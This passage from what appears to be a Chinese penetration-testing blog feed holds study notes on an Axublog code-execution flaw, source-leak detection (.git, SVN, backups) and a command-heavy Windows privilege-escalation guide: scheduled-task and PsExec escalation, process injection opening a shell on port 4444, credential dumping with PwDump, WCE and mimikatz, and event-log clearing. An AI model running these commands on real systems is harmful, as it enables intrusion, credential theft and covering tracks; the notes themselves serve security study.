title="代码执行漏洞"></a>代码执行漏洞</h4><p>漏洞点：admin/html.php</p><p>漏洞分析：在生成about页面的时候调用了ob_get_contents函数执行about.mb里面的php代码，并且没有进行任何过滤，所以我们可以通过向about.md文件中写入php代码，从而使其被执行。然而在后台管理页面中正好有编辑about页功能。</p><p><img src="1587018-20200304210913536-1220729563.png" alt="img"></p><p>漏洞利用：</p><p>首先编辑about页，然后向其中写入想要执行的php代码即可，此处我使用file_put_contents函数生成一个文件名为shell2.php的探针文件。</p><p><img src="1587018-20200304211607584-434322337.png" alt="img"></p><p>保存编辑后选择生成about：</p><p><img src="1587018-20200304211905560-277463672.png" alt="img"></p><p>然后我们的代码就被成功的执行了，访问shell2.php:</p><p><img src="1587018-20200304212324112-1387100175.png" alt="img"></p><h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="http://www.ttk7.cn/post-82.html" target="_blank" rel="noopener">http://www.ttk7.cn/post-82.html</a></p><p><a href="https://blog.csdn.net/sweet0swat/article/details/89056383" target="_blank" rel="noopener">https://blog.csdn.net/sweet0swat/article/details/89056383</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Axublog代码审计学习&quot;&gt;&lt;a href=&quot;#Axublog代码审计学习&quot; class=&quot;headerlink&quot; title=&quot;Axublog代码审计学习&quot;&gt;&lt;/a&gt;Axublog代码审计学习&lt;/h2&gt;&lt;h4 id=&quot;前台数字型sql注入&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
    
      <category term="代码审计学习" scheme="https://shu1l.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Axublog" scheme="https://shu1l.github.io/tags/Axublog/"/>
    
  </entry>
  
  <entry>
    <title>敏感信息泄露常见类型</title>
    <link href="https://shu1l.github.io/2020/04/19/min-gan-xin-xi-xie-lu-chang-jian-lei-xing/"/>
    <id>https://shu1l.github.io/2020/04/19/min-gan-xin-xi-xie-lu-chang-jian-lei-xing/</id>
    <published>2020-04-19T10:33:38.000Z</published>
    <updated>2020-04-22T14:38:26.408Z</updated>
    
    <content type="html"><![CDATA[<h2 id="敏感信息泄露-源码泄露-学习笔记"><a href="#敏感信息泄露-源码泄露-学习笔记" class="headerlink" title="敏感信息泄露/源码泄露  学习笔记"></a>敏感信息泄露/源码泄露  学习笔记</h2><h4 id="1-什么是敏感数据？"><a href="#1-什么是敏感数据？" class="headerlink" title="1.什么是敏感数据？"></a>1.什么是敏感数据？</h4><p>  敏感数据包括但不限于：口令、密钥、证书、会话标识、Licence、隐私数据、授权凭据、个人数据等、在程序文件、配置文件、日志文件、备份文件及数据库中都有可能包含敏感数据。</p><h4 id="1、-git文件泄露漏洞"><a href="#1、-git文件泄露漏洞" class="headerlink" title="1、.git文件泄露漏洞"></a>1、.git文件泄露漏洞</h4><p><strong>漏洞描述：</strong>git在初始化项目的时候，会在项目的根目录（git rev-parse  –show-toplevel查看）创建一个名为<code>.git</code>的隐藏文件夹，里面包含了本地所有commit的历史纪录，如果无意间将这个目录置于Web的路径下让用户可以访问，那么也就泄露了几乎所有的源代码和其他的敏感信息。可能泄露的内容：</p><ul><li>所有该项目的源码</li><li>私有仓库的地址</li><li>私密的配置信息。</li><li>所有commiter的邮箱账号信息</li><li>内部的账号和密码。。</li></ul><p><strong>检测方式：</strong>   工具：GitHack  使用方法：</p><p>​                 <code>python GitHack.py  http://网站地址/.git/</code></p><p><strong>示例：</strong>来源(i春秋web Hello world);</p><p>进入题目，查看源码，只发现一个js文件</p><img src="QQ截图20200119121609.png" style="zoom:50%;" /><p>我们尝试使用Githack来判断网站是否有.git泄露。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200119121109.png" alt=""></p><p>可见该网站下存在.git泄露，并且在工具文件夹下得到了泄露的文件内容。</p><img src="QQ截图20200119121116.png" style="zoom:50%;" /><h4 id="2、-hg源码泄露漏洞"><a href="#2、-hg源码泄露漏洞" class="headerlink" title="2、.hg源码泄露漏洞"></a>2、.hg源码泄露漏洞</h4><p><strong>漏洞描述：</strong><a href="https://www.mercurial-scm.org/" target="_blank" rel="noopener">Mercurial</a>的意思是水银, 所以缩写成hg(汞), 也是一个版本管理软件. 用法和git有点类似, 但也保留了svn命令简明的特点, 而且原生地支持Windows/MacOS/Linux三大平台, 不像git需要MinGW才得以运行, 所以当今也有不少人偏向于用hg做版本控制.</p><p><strong>检测方式：</strong>工具dvcs-ripper,使用方法：<code>rip-hg.pl -v -u http://域名/.hg/</code></p><h4 id="3、DS-Store源码泄露漏洞"><a href="#3、DS-Store源码泄露漏洞" class="headerlink" title="3、DS_Store源码泄露漏洞"></a>3、DS_Store源码泄露漏洞</h4><p><strong>漏洞描述：</strong>在发布代码时，没有删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息，<a href="http://www.xxx.com/.ds_store" target="_blank" rel="noopener">http://www.xxx.com/.ds_store</a></p><p><strong>检测方式：</strong>dsstoreexp,使用方式：<code>python ds_store_exp.py http://域名/.Ds.store</code></p><h4 id="4、robots导致文件泄露"><a href="#4、robots导致文件泄露" class="headerlink" title="4、robots导致文件泄露"></a>4、robots导致文件泄露</h4><p><strong>漏洞描述：</strong>搜索引擎可以通过robots文件获知哪些页面可以爬取，哪些页面不可以爬取。Robots协议是网站国际互联网通行的道德规范。其目的是保护网站数据和明杆信息 、确保用户个人信息和隐私不被侵犯，如果robots.txt文件太过详细，反而会泄露网站的敏感目录或者文件，比如网站后台路径，从而得知其使用的系统类型，从而有针对性地进行利用。</p><p><strong>检测方式：</strong>1.我们可以直接使用御剑进行后台扫描，或者直接用爬虫进行爬取，从而找到robots.txt文件。</p><p>​                   2.直接在网站URL输入/robots.txt进行查看。</p><p><strong>修复方案：</strong>为了不让robots.txt中的内容不泄露网站的后台和隐私，我们可以使用星号（*）作为通配符进行设置。例如限制访问我们的后台admin目录，则规则为：</p><p>​       <img src="QQ截图20200119110404.png" style="zoom: 80%;" /></p><p>​             当我们又不想泄露我们的敏感目录时，我们可以使用星号(*)作为通配符即可。</p><img src="QQ截图20200119110727.png" style="zoom:80%;" /><p>​                 </p><h4 id="5、备份文件泄露漏洞"><a href="#5、备份文件泄露漏洞" class="headerlink" title="5、备份文件泄露漏洞"></a>5、备份文件泄露漏洞</h4><p><strong>漏洞描述：</strong>备份文件泄露又分为两种情况, 一种是运维人员偷懒地直接在网站根目录用类似<code>tar -czvf    bakup.tgz</code>的命令将网站进行备份,<br> 这样整站的源代码都能直接被用户打包下载了； 另一种是开发或者运维人员使用的编辑器修改文件时自动备份了所编辑的网页内容,<br> 如vim的<code>.swp</code>, 从而泄露了该网页的源代码。<br><strong>检测方式：</strong>常见的备份文件后缀名：直接在URL中进行检测。</p><pre><code>*.rar    *.zip   *.7z   *.tar.gz   *.bak   *.swp   *.txt   *.html</code></pre><p>​                   或者使用工具比如AWVS进行扫描。</p><p><strong>修复方案：</strong>做好版本管理, 并利用版本管理工具过滤掉这些类型的文件, 同时不要直接在生产环境中修改或者添加文件</p><h4 id="6、phpinfo-）信息泄露漏洞"><a href="#6、phpinfo-）信息泄露漏洞" class="headerlink" title="6、phpinfo(）信息泄露漏洞"></a>6、phpinfo(）信息泄露漏洞</h4><p><strong>漏洞描述</strong>：Web站点的某些测试页面可能会使用到PHP的phpinfo()函数，会输出服务器的关键信息。</p><img src="sec_hole_13.png" style="zoom:67%;" /><p><strong>检测方式 ：</strong>访问<a href="http://ip/phpinfo.php看是否成功。" target="_blank" rel="noopener">http://ip/phpinfo.php看是否成功。</a></p><p><strong>修复方案 ：</strong>删除该PHP文件。</p><h4 id="7、SVN文件泄露漏洞"><a href="#7、SVN文件泄露漏洞" class="headerlink" title="7、SVN文件泄露漏洞"></a>7、SVN文件泄露漏洞</h4><p><strong>漏洞描述：</strong>Subversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。</p><p><strong>漏洞检测：</strong> </p><p>1.漏洞利用工具： Seay SVN漏洞利用工具</p><p>2、添加网站url</p><p>在被利用的网址后面加 /.svn/entries，列出网站目录，甚至下载整站。</p><h5 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1.不要使用svn checkout和svn up更新服务器上的代码，使用svn export（导出）功能代替。</p><p>2.服务器软件（Nginx、apache、tomcat、IIS等）设置目录权限，禁止访问.svn目录</p><p>m’g</p><h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="https://ninjia.gitbook.io/secskill/web/info" target="_blank" rel="noopener">https://ninjia.gitbook.io/secskill/web/info</a></p><p><a href="https://blog.csdn.net/wy_97/article/details/78165051" target="_blank" rel="noopener">https://blog.csdn.net/wy_97/article/details/78165051</a></p><p><a href="https://www.cnblogs.com/Hydraxx/p/10762512.html" target="_blank" rel="noopener">https://www.cnblogs.com/Hydraxx/p/10762512.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;敏感信息泄露-源码泄露-学习笔记&quot;&gt;&lt;a href=&quot;#敏感信息泄露-源码泄露-学习笔记&quot; class=&quot;headerlink&quot; title=&quot;敏感信息泄露/源码泄露  学习笔记&quot;&gt;&lt;/a&gt;敏感信息泄露/源码泄露  学习笔记&lt;/h2&gt;&lt;h4 id=&quot;1-什么是敏感
      
    
    </summary>
    
    
      <category term="web漏洞学习" scheme="https://shu1l.github.io/categories/web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="敏感信息泄露" scheme="https://shu1l.github.io/tags/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
  </entry>
  
  <entry>
    <title>windows中常见提权方式总结</title>
    <link href="https://shu1l.github.io/2020/04/03/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-yi/"/>
    <id>https://shu1l.github.io/2020/04/03/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-yi/</id>
    <published>2020-04-03T11:58:36.000Z</published>
    <updated>2020-04-29T05:42:06.416Z</updated>
    
    <content type="html"><![CDATA[<h2 id="渗透测试中常见提权方式总结（一）"><a href="#渗透测试中常见提权方式总结（一）" class="headerlink" title="渗透测试中常见提权方式总结（一）"></a>渗透测试中常见提权方式总结（一）</h2><h3 id="windows提权——本地提权"><a href="#windows提权——本地提权" class="headerlink" title="windows提权——本地提权"></a>windows提权——本地提权</h3><ul><li>已实现本地低权限账号登录<ul><li>远程溢出</li><li>直接获得账号密码</li></ul></li><li>希望获得更高权限<ul><li>实现对目标进一步控制</li></ul></li><li>系统账号之间权限隔离<ul><li>操作系统安全的基础</li><li>用户空间</li><li>内核空间</li></ul></li><li>系统账号<ul><li>用户账号登录时获取权限令牌</li><li>服务账号无需用户登录已在后台启动服务</li></ul></li><li>Windows<ul><li>users</li><li>Administrator</li><li>System</li></ul></li></ul><h4 id="Windows系统提权"><a href="#Windows系统提权" class="headerlink" title="Windows系统提权"></a>Windows系统提权</h4><h5 id="1-使用-at-提权-（当前仅适用于-WinXp-及-Windows-server-2003-等低级版本）"><a href="#1-使用-at-提权-（当前仅适用于-WinXp-及-Windows-server-2003-等低级版本）" class="headerlink" title="1.使用 at 提权 （当前仅适用于 WinXp 及 Windows server 2003 等低级版本）"></a>1.使用 at 提权 （当前仅适用于 WinXp 及 Windows server 2003 等低级版本）</h5><pre><code> # 修改密码：net user kevin * C:\Documents and Settings\kevin&gt;net user kevin *     Type a password for the user:     Retype the password to confirm:     The command completed successfully. # 查看系统用户：net user C:\Documents and Settings\kevin&gt;net user     User accounts for \\DH-CA8822AB9589     ---------------------------------------------------------------------     Administrator            Guest                    HelpAssistant     IUSR_DH-CA8822AB9589     IWAM_DH-CA8822AB9589     kevin     SUPPORT_388945a0     The command completed successfully. # 查看用户状态： C:\Documents and Settings\kevin&gt;net user kevin     User name                    kevin     Full Name                    kevin     Comment     User&#39;s comment     Country code                 000 (System Default)     Account active               Yes     Account expires              Never     Password last set            2/28/2018 2:05 PM     Password expires             Never     Password changeable          2/28/2018 2:05 PM     Password required            Yes     User may change password     Yes     Workstations allowed         All     Logon script     User profile     Home directory     Last logon                   2/28/2018 2:03 PM     Logon hours allowed          All     Local Group Memberships      *Administrators       *Users     Global Group memberships     *None     The command completed successfully.</code></pre><p>1.查看用户进程</p><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427202422.png" alt=""></p><p>2.将 administrator 用户权限提升为 system 权限</p><pre><code>  C:\Documents and Settings\administrator&gt;cd \  C:\&gt;at -?  C:\&gt;at 2:15 /interactive cmd  #必须是未来时间，否则将是明天时间      Added a new job with job ID = 1  C:\&gt;at  Status ID   Day                     Time          Command Line  ---------------------------------------------------------------------          1   Today                     2:15 AM       cmd</code></pre><p>我们看到这里弹出了system权限的命令框</p><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427203025.png" alt=""></p><p>3.用新的 system 权限的窗口启动任务管理器</p><pre><code>  C:\WINDOWS\system32&gt;taskmgr</code></pre><p>4.关闭之前的explorer</p><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427203207.png" alt=""></p><p>5.应用程序-&gt;新任务-&gt;explorer</p><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427203521.png" alt=""></p><p>6.验证桌面用户权限</p><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427203554.png" alt=""></p><h5 id="2-使用-sc-提权-适用于-Win7-及Windows-server-2008-等高级版本"><a href="#2-使用-sc-提权-适用于-Win7-及Windows-server-2008-等高级版本" class="headerlink" title="2.使用 sc 提权 (适用于 Win7 及Windows server 2008 等高级版本)"></a>2.使用 sc 提权 (适用于 Win7 及Windows server 2008 等高级版本)</h5><p>1.运行-&gt;services.msc</p><pre><code>- C:\Users\root&gt;cd \- C:&gt;sc Create syscmd binPath= “cmd /K start” type= own type= interact- C:&gt;sc start syscmd</code></pre><p>3.使用 Sysinternals Suite 套件</p><p>推荐书籍 《Windows Internals第7版》</p><p><a href="https://download.sysinternals.com/files/SysinternalsSuite.zip" target="_blank" rel="noopener">Sysinternals Suite 套件下载</a></p><ul><li><p>下载之后解压使用其中的 PsExec 放在C盘根目录</p><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427205521.png" alt=""></p></li><li><p>启动 PsExec.exe</p></li></ul><pre><code>  C:\&gt;PsExec.exe  -i: 交互模式  -s: 使用系统账户  C:\&gt;psexec -p&#39;sei -s -d taskmgr  C:\&gt;PsExec.exe -i -s cmd</code></pre><ul><li>提权结果</li></ul><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427205652.png" alt=""></p><h4 id="注入进程提权"><a href="#注入进程提权" class="headerlink" title="注入进程提权"></a>注入进程提权</h4><ul><li>pinjector.exe</li></ul><p>下载：<a href="https://www.tarasco.org/security/Process_Injector/：" target="_blank" rel="noopener">https://www.tarasco.org/security/Process_Injector/：</a></p><ul><li>下载之后解压使用其中的 PsExec 放在C盘根目录</li></ul><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427205858.png" alt=""></p><ul><li>列出可注入进程及其信息<ul><li>C:&gt;pinjector.exe</li><li>C:&gt;pinjector.exe -l</li></ul></li><li>找一个未使用端口<ul><li>C:&gt;netstat -nao | find “4444” </li><li>无结果表示未使用</li></ul></li><li>选择一个进程注入</li></ul><pre><code>  C:\&gt;pinjector.exe -l      PID    668 services.exe ( 16 Threads)  USER: \\NT AUTHORITY\SYSTEM  C:\&gt;pinjector.exe -p 668 cmd 4444      Privilege Switcher for Win32(Private version)      (c) 2006 Andres Tarasco - atarasco@gmail.com      [+] Trying to execute cmd to 668 as: ? \      [+] Code inyected... ; )</code></pre><ul><li>查看被注入的进程的监听状态</li></ul><pre><code>  C:\&gt;netstat -nao | find &quot;555&quot;      TCP    0.0.0.0:555            0.0.0.0:0              LISTENING       668</code></pre><ul><li>利用此监听端口</li></ul><pre><code>  root@kali：~# nc -nv 192.168.153.143 4444      Connection to 10.10.10.128 555 port [tcp/*] succeeded!      Microsoft Windows XP [?汾 5.1.2600]      (C) ??????? 1985-2001 Microsoft Corp  C:\WINDOWS\system32&gt;whoami      whoami      SYSTEM</code></pre><ul><li>查看进程</li></ul><pre><code>  使用 SysinternalsSuite/procexp.exe 查看进程</code></pre><h4 id="读取windows本地密码进行提权"><a href="#读取windows本地密码进行提权" class="headerlink" title="读取windows本地密码进行提权"></a>读取windows本地密码进行提权</h4><h5 id="1-抓包嗅探"><a href="#1-抓包嗅探" class="headerlink" title="1. 抓包嗅探"></a>1. 抓包嗅探</h5><ol><li>Windows<ul><li>Wireshark</li><li>Omnipeek</li><li>Commview</li><li>Sniffpass：抓取密码相关的数据包</li></ul></li><li>Linux<ul><li>Tcpdump</li><li>Wireshark</li><li>Dsniff：抓取密码相关的数据包</li></ul></li></ol><h5 id="2-键盘记录本地密码"><a href="#2-键盘记录本地密码" class="headerlink" title="2. 键盘记录本地密码"></a>2. 键盘记录本地密码</h5><ul><li>可以使用木马软件 DarkCometRAT</li><li>在控制目标主机之后可以监控键盘记录信息</li></ul><h5 id="3-查看本地缓存密码"><a href="#3-查看本地缓存密码" class="headerlink" title="3.查看本地缓存密码"></a>3.查看本地缓存密码</h5><ul><li>在浏览器查看缓存密码</li></ul><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427211834.png" alt=""></p><ul><li><p>windows 密码恢复工具</p><ul><li><a href="http://www.nirsoft.net/password_recovery_tools.html" target="_blank" rel="noopener">Windows Password Recovery Tools</a></li></ul></li><li><p>使用 Pwdump 查看 windows 本地登录密码</p><ul><li>windows 登录密码保存在 C:\Windows\System32\config\SAM 文件中</li><li>pwdump 在 kali 系统中可以找到 /usr/share/windows-binaries/fgdump/</li><li>添加用户</li></ul><pre><code>  C:\Documents and Settings\kevin&gt;net user user2 123456 /add  C:\Documents and Settings\kevin&gt;net user      \\ICST-WINATT 的用户帐户      -------------------------------------------------------------      Administrator            Guest                    HelpAssistant      kevin                    SUPPORT_388945a0         test      user1                    user2  C:\Documents and Settings\kevin&gt;cd \  C:\&gt;PwDump.exe localhost      Administrator:500:18D583B495C4696AFF17365FAF1FFE89:5D36F0CA14EEBEF32F55C7B6A4675DB0:::      Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::      HelpAssistant:1000:5906F3A72959D5902440275BA555A537:10AA20D63C3EC71E0102AC95ADF6DF73:::      kevin:1004:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::      SUPPORT_388945a0:1002:NO PASSWORD*********************:8AFA81401E8D8EBFA42B4E46F6507C07:::      test:1005:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::      user1:1006:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::      user2:1007:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::Completed.  # 结果：前部分是 LMHASH ，后部分是 NTLMHASH</code></pre><ul><li><p>可以将结果保存在文件中，然后在 kali 中进行破解</p><p><img src="https://img-blog.csdnimg.cn/20190413165117218.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li></ul></li></ul><h4 id="WCE-WINDOWS-CREDENTIAL-EDITOR"><a href="#WCE-WINDOWS-CREDENTIAL-EDITOR" class="headerlink" title="WCE (WINDOWS CREDENTIAL EDITOR)"></a>WCE (WINDOWS CREDENTIAL EDITOR)</h4><ul><li>WINDOWS身份认证过程</li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165135348.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="WCE-WINDOWS-CREDENTIAL-EDITOR-1"><a href="#WCE-WINDOWS-CREDENTIAL-EDITOR-1" class="headerlink" title="WCE (WINDOWS CREDENTIAL EDITOR)"></a>WCE (WINDOWS CREDENTIAL EDITOR)</h5><ul><li>windows 内核中保存有密码明文副本，安全机制较低</li><li>需要管理员权限</li><li>工具保持在 kali 的 /usr/share/wce/wce-universal # 通用格式是自动识别32位和64位</li><li>多用户登录目标主机</li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165139664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>列举登录账号及会话</li></ul><pre><code>  C:\&gt;wce-universal.exe -lv      0020B19D:user1:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4      001E5D92:user2:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4      001B9220:test:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4      0000C7CE:kevin:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4      000003E4:ICST-WINATT$:MSHOME:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0      # 与 C:\&gt;PwDump.exe localhost 结果相同</code></pre><ul><li><p>每隔5秒刷新一次</p><ul><li>wce-universal.exe -r</li></ul></li><li><p>删除登录会话</p><pre><code>  C:\&gt;wce-universal.exe -d 0020B19D  C:\&gt;wce-universal.exe -lv      001E5D92:user2:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4      001B9220:test:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4      0000C7CE:kevin:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4      000003E4:ICST-WINATT$:MSHOME:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0</code></pre></li><li><p>计算密码对应的 HASH 值</p></li></ul><pre><code>  C:\&gt;wce-universal.exe -g passwd      Password:   passwd      Hashes:     91C7AE7122196B5EAAD3B435B51404EE:22315D6ED1A7D5F8A7C98C40E9FA2DEC</code></pre><ul><li>读取内核中的明文密码</li></ul><pre><code>  C:\&gt;wce-universal.exe -w      user1\ICST-WINATT:123456      user2\ICST-WINATT:123456      test\ICST-WINATT:123456      kevin\ICST-WINATT:123456      NETWORK SERVICE\MSHOME:  C:\&gt;net user user1 111222      命令成功完成。  C:\&gt;wce-universal.exe -w      user1\ICST-WINATT:123456      user2\ICST-WINATT:123456      test\ICST-WINATT:123456      kevin\ICST-WINATT:123456      NETWORK SERVICE\MSHOME:  # 当前内核中保存的值会在下次登录被读取出来</code></pre><ul><li>对 LUID 进行修改（将LUID改为匹配其他用户的用户名和密码）</li></ul><pre><code>  C:\&gt;wce-universal.exe -lv      001E5D92:user2:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4      001B9220:test:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4      0000C7CE:kevin:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4      000003E4:ICST-WINATT$:MSHOME:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0  C:\&gt;wce-universal.exe -i 001E5D92 -s kevin:ICST-    WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4      Changing NTLM credentials of logon session 001E5D92h to:      Username: kevin      domain: ICST-WINATT      LMHash: 44EFCE164AB921CAAAD3B435B51404EE      NTHash: 32ED87BDB5FDC5E9CBA88547376818D4      NTLM credentials successfully changed!  C:\&gt;wce-universal.exe -lv      001E5D92:kevin:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4      001B9220:test:ICST-WINATT:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4      000003E4:ICST-WINATT$:MSHOME:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0</code></pre><ul><li><p>Win7 及 之前默认 都可遭受 WCE 攻击</p><ul><li>防范方法：修改注册表</li></ul><pre><code>  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code></pre><ul><li>删除 wdigest 之后重启计算机</li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165146599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li></ul><h5 id="fgdump"><a href="#fgdump" class="headerlink" title="fgdump"></a>fgdump</h5><ul><li>PwDump localhost<ul><li>位置：Pwdump 在 kali 系统中可以找到 /usr/share/windows-binaries/fgdump/</li></ul></li><li>fgdump<ul><li>位置：Pwdump 在 kali 系统中可以找到 /usr/share/windows-binaries/fgdump/<br>放在 WinXP 中， 双击或在命令行执行 fgdump.exe 会自动生成三个文件，文件中保存着密码</li></ul></li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165151759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h5><ul><li>在 kali 中的路径 /usr/share/mimikatz，将 win32 复制到 windows 主机</li></ul><pre><code>  C:\Win32&gt;mimikatz.exe  查看帮助是：：  mimikatz # ::              standard  -  Standard module  [Basic commands (does not require module name)]                crypto  -  Crypto Module              sekurlsa  -  SekurLSA module  [Some commands to enumerate credentials...]              kerberos  -  Kerberos package module  []             privilege  -  Privilege module               process  -  Process module               service  -  Service module               lsadump  -  LsaDump module                    ts  -  Terminal Server module                 event  -  Event module                  misc  -  Miscellaneous module                 token  -  Token manipulation module                 vault  -  Windows Vault/Credential module           minesweeper  -  MineSweeper module                   net  -                 dpapi  -  DPAPI Module (by API or RAW access)  [Data Protection application programming interface]             busylight  -  BusyLight Module                sysenv  -  System Environment Value module                   sid  -  Security Identifiers module                   iis  -  IIS XML Config module                   rpc  -  RPC control of mimikatz              mimikatz # privilege::              Module :        privilege              Full name :     Privilege module                 debug  -  Ask debug privilege            * *                driver  -  Ask load driver privilege              security  -  Ask security privilege                   tcb  -  Ask tcb privilege                backup  -  Ask backup privilege               restore  -  Ask restore privilege                sysenv  -  Ask system environment privilege                    id  -  Ask a privilege by its id                  name  -  Ask a privilege by its name  mimikatz # privilege::debug  mimikatz # sekurlsa::  mimikatz # sekurlsa::logonPasswords  mimikatz # sekurlsa::wdigest  mimikatz # process::list  mimikatz # lsadump::sam  mimikatz # lsadump::cache  mimikatz # ts::multirdp  mimikatz # event::clear  mimikatz # event::drop  mimikatz # misc::regedit  mimikatz # token::whoami</code></pre><h4 id="利用漏洞提权"><a href="#利用漏洞提权" class="headerlink" title="利用漏洞提权"></a>利用漏洞提权</h4><h5 id="1-使用-Ms011-080-获取-WinXP-的-SYSTEM-权限"><a href="#1-使用-Ms011-080-获取-WinXP-的-SYSTEM-权限" class="headerlink" title="1. 使用 Ms011-080 获取 WinXP 的 SYSTEM 权限"></a>1. 使用 Ms011-080 获取 WinXP 的 SYSTEM 权限</h5><ul><li><p>Ms011-080 对应补丁 Kb2592799</p><p><a 